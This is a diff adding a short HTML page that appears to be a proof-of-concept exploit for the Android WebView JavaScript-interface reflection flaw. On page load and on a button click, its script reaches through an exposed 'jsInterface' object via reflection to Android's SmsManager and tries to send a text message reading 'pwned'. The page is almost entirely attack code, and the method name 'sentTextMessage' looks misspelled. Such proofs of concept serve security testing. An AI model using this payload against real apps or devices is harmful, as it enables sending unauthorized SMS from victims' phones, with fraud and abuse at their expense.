@@ -1,0 +1,15 @@
+<html>
+<head>
+<title>send sms</title>
+<script type="text/javascript">
+function execute(){
+	var sendsms = jsInterface.getClass().forName("android.telephony.SmsManager").getMethod("getDefault",null).invoke(null,null);
+	sendsms.sentTextMessage("test",null,"pwned",null,null);
+}
+</script>
+</head>
+<body onload="execute()">
+Send Sms!
+<input type="button" onclick="execute()" value="click me"></input>
+</body>
+</html>
